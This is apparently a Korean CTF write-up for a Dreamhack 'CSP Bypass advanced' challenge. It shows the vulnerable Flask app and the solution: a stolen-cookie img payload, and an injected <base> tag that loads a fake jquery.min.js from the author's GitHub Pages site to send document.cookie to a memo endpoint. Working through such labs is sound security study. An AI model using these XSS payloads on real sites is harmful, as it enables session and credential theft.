---
title: "[2025-08-06] CSP Bypass advanced"
excerpt: "XSS"

categories:
  - Problem
tags:
  - [XSS]

permalink: /Problem/[2025-08-06] CSP Bypass advanced/

toc: true
toc_sticky: true

date: 2025-08-06
last_modified_at: 2025-08-06
---

## 🦥 본문

- app.py

```html
#!/usr/bin/python3
from flask import Flask, request, render_template
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)
nonce = os.urandom(16).hex()

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"

def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        service = Service(executable_path="/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True

def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)

@app.after_request
def add_header(response):
    global nonce
    response.headers['Content-Security-Policy'] = f"default-src 'self'; img-src https://dreamhack.io; style-src 'self' 'unsafe-inline'; script-src 'self' 'nonce-{nonce}'; object-src 'none'"
    nonce = os.urandom(16).hex()
    return response

@app.route("/")
def index():
    return render_template("index.html", nonce=nonce)

@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    return render_template("vuln.html", param=param, nonce=nonce)

@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html", nonce=nonce)
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return f'<script nonce={nonce}>alert("wrong??");history.go(-1);</script>'

        return f'<script nonce={nonce}>alert("good");history.go(-1);</script>'

memo_text = ""

@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text, nonce=nonce)

app.run(host="0.0.0.0", port=8000)

```

기존의 코드에서 취약했던/vuln 에서 render_template()를 사용하여 html을 리턴하는 방식으로 바꼈다.

- vuln.html

```html
{% raw %}
{% block content %}
  {{ param | safe }}
{% endblock %}
{% endraw %}
```

 

위와 같이 html이 되어 있길래 아래와 같이 보냈는 데 실패 했다.

```html
<img src="https://dreamhack.io/xxx" onerror="location.href='/memo?memo='+ document.cookie">
```

마침 `base-uri` 가 설정되어 있지 않기 때문에 `<base>` 태그를 삽입하여 공격할 수 있다고 생각했다.

### 풀이

- 기본 틀인 base.html에서 다음과 같은 코드가 있다

```html
		{% raw %}
		<script src="{{ url_for('static', filename='js/jquery.min.js')}}" nonce={{ nonce }}></script>
    <script src="{{ url_for('static', filename='js/bootstrap.min.js') }}" nonce={{ nonce }}></script>
    {% endraw %}
```

- base-uri를 통해 공격 서버를 만들고 해당 서버에서 다음과 같은 코드를 보냄

```html
location.href="http://127.0.0.1:8000/memo?memo="+ document.cookie
```

- 위의 코드를 받은 스크립트 문이 vuln API에서 렌더링되기 때문에 공격 성공

1. 개인 서버가 없기 때문에 github 블로그를 통해 JS 코드를 전달할 것이다.
2. gitblog에 static/js 폴더를 만들고 jquery.min.js 파일을 아래와 같이 만들었다

```html
location.href="http://127.0.0.1:8000/memo?memo="+ document.cookie
```

1. `<base>` 태그를 통해 해당 코드에 접근하게 했다

```html
<base href="https://yunseo10987.github.io/">
```